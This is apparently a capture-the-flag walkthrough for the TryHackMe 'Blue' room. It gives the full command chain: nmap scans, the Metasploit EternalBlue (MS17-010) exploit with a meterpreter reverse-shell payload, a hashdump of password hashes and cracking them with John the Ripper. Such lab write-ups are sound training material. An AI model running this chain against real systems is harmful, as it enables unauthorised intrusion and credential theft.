# Blue

**Room Link:** [https://tryhackme.com/room/blue](https://tryhackme.com/room/blue)

## **Walkthrough**

### **Recon**

```
nmap -A 10.10.68.22
```

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1)  (10).png" alt="" data-size="original">

The box is vulnerable to ms17-010

```
nmap -p135,139,445,3389 --script=vuln 10.10.68.22
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Gain Access / Escalate

```
msfconsole 
search eternalblue 
use exploit/windows/smb/ms17_010_eternalblue 
set payload windows/x64/meterpreter/reverse_tcp 
set RHOSTS 10.10.68.22 
run
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

### Cracking

```
hashdump
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) ( (2).png" alt=""><figcaption></figcaption></figure>

```
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

<figure><img src="../../.gitbook/assets/image (3) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Flags

Just ran this to find the locations of all the flags then grabbed them

```
cd C:\
dir "flag*" /s
```

<figure><img src="../../.gitbook/assets/image (5) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>
